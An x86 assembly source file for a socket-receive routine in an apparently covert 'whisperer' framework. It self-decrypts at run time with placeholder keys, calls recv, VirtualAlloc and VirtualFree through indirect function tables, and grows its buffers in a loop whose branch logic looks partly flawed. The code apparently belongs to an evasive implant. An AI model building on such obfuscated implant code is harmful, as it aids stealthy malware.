use32
org 0



RecvBlockCall:
        push ebp
        mov ebp, esp
        sub esp, 20 ;

        mov ebx, 0xaaaaaaaa ;key0
        mov edx, 0xbbbbbbbb ;key1
        mov ecx, .call_end - .call_begin

        mov eax, [ebp + 8] ; eax = whisperer context
        mov eax, [eax] ; eax = whisperer framework
        mov eax, [eax + 16] ; eax = decryption function

        call eax

.call_begin:
dq 0x2222222222222222 ; delimiter, gets filled with nops at run time

        mov ebx, [ebp + 8] ; ebx = context

        xor ecx, ecx
        mov [ebp - 12], ecx ; zero offset
        mov [ebp - 20], ecx ; zero total bytes read

        mov ecx, [ebx + 856] ; ecx = buffer size
        mov [ebp - 4], ecx ; store buffer size

        push ecx
        call .alloc ; allocate initial buffer

        test eax, eax ; no buffer returned
        jz .failure

        mov [ebp - 8], eax ; store buffer


.read_loop:
        mov ebx, [ebp + 8] ; ebx = context


        push 0 ; flags
        mov eax, dword [ebp - 4] ; buffer size
        sub eax, dword [ebp - 12] ; subtract offset, eax = real size

        mov [ebp - 16], eax ; save bytes expected

        push eax  ; push size

        mov eax, dword [ebp - 8] ; eax = buffer base
        add eax, dword [ebp - 12] ; eax = buffer+offset

        push eax ; push buffer
        push dword [ebx + 32] ; sockethandle

        mov ebx, [ebx] ; ebx = framework
        call dword [ebx + 48] ; call recv

        cmp eax, 0xffffffff
        je .failure

        mov ebx, [ebp + 8] ; ebx = context

        test eax, eax
        jz .exit

        cmp eax, dword [ebp - 16] ; we read all the bytes expected, try to read more
        je .realloc

        cmp eax, 0xffffffff
        je .failure

.realloc:
        add [ebp - 20], eax ; add to total bytes read

        mov ebx, [ebp + 8] ; ebx = context

        mov edx, [ebp - 4]  ; edx = previous total size
        add edx, [ebx + 856] ; edx = new size

        push edx ; save edx

        push edx
        call .alloc ; allocate buffer

        pop edx ; restore edx

        mov edi, eax  ; dest = newly allocated buffer
        mov esi, [ebp - 8] ; source = previous buffer
        mov ecx, [ebp - 4] ; ecx = previous count

        rep movsb ; copy to new buffer

        mov [ebp - 4], edx ; store new size

        push eax ; save new buffer

        push dword [ebp - 8] ; push old buffer
        call .free ; free old buffer

        pop eax ; restore new buffer

        mov dword [ebp - 8], eax ; store new buffer on stack
        mov eax, dword [ebx + 856] ; eax = offset
        add dword [ebp - 12], eax ; increment offset

        jmp .read_loop ; read




.alloc:
        push ebp
        mov ebp, esp



        push 4 ; PAGE_READWRITE
        push 12288 ; MEM_COMMIT | MEM_RESERVE
        push dword [ebp + 8] ; size
        push 0 ; NULL

        mov eax, [ebp] ; eax = previous stack frame
        mov eax, [eax + 8] ; eax = context
        mov eax, [eax] ; eax = framework

        call dword [eax + 32] ; call virtualalloc


        pop ebp
        ret 4

.free:
        push ebp
        mov ebp, esp

        push 0x8000 ; MEM_RELEASE
        push 0 ; size zero for MEM_RELEASE
        push dword [ebp + 8] ; buffer

        mov eax, [ebp] ; eax = previous stack frame
        mov eax, [eax + 8]; eax = context
        mov eax, [eax] ; eax = framework

        call dword [eax + 36] ; call virtualfree

        db 9 dup (0x90)

        pop ebp
        ret 4


.failure:
        mov ebx, [ebp + 8] ; ebx = context
        mov dword [ebx + 848], 0xffffffff ; set fail code

        push dword [ebp - 8] ; push response buffer
        call .free ; free buffer

        jmp .no_grace

.exit:
        mov ebx, [ebp + 8] ; ebx = context

        mov eax, dword [ebp - 20] ; eax = total bytes read
        mov dword [ebx + 844], eax ; response length = eax

        mov eax, dword [ebp - 8]  ; eax = response buffer
        mov dword [ebx + 36], eax ; receivebuffer = eax

        mov dword [ebx + 848], 0 ; set success code


.no_grace:
        mov esp, ebp
        pop ebp
        ret 4

.call_end: